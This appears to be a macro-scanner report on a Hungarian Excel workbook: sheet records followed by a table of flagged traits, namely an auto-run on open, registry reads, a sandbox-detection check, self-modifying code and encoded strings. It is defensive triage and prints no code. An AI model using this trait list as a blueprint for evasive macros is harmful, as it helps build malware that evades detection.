in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  2-2le
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  1-5fe
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  1-6fe
' 0085     25 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  1-7fejEP Massari
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  2-1fe
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  2-2fe
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  2-3fe
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  2-4fe
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  2-5fe
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  2-6fej
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  2-7fe
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  2-8fe
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  2-9fe
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  2-1le
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  leválaszt
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Káb 52 ér
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Káb 13 érp
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Vonalkábe
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  EP Massar
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka2
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka2
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka2
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka2
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka2
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka2
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka2
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka2
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka2
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka2
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka3
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka3
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka3
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka3
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka3
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka3
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka3
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka3
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka3
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka3
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka4
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka4
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka4
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka4
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka4
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka4
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka4
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka4
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka4
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka4
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka5
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka5
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka5
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka5
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka5
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka5
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka5
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka5
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka5
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka5
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Munka6
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegOpenKeyEx        |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|RegQueryValueExA    |May read registry keys                       |
|Suspicious|RegQueryValueEx     |May read registry keys                       |
|Suspicious|GetVolumeInformation|May detect Anubis Sandbox                    |
|          |A                   |                                             |
|Suspicious|GetVolumeInformation|May detect Anubis Sandbox                    |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ADVAPI32.DLL        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

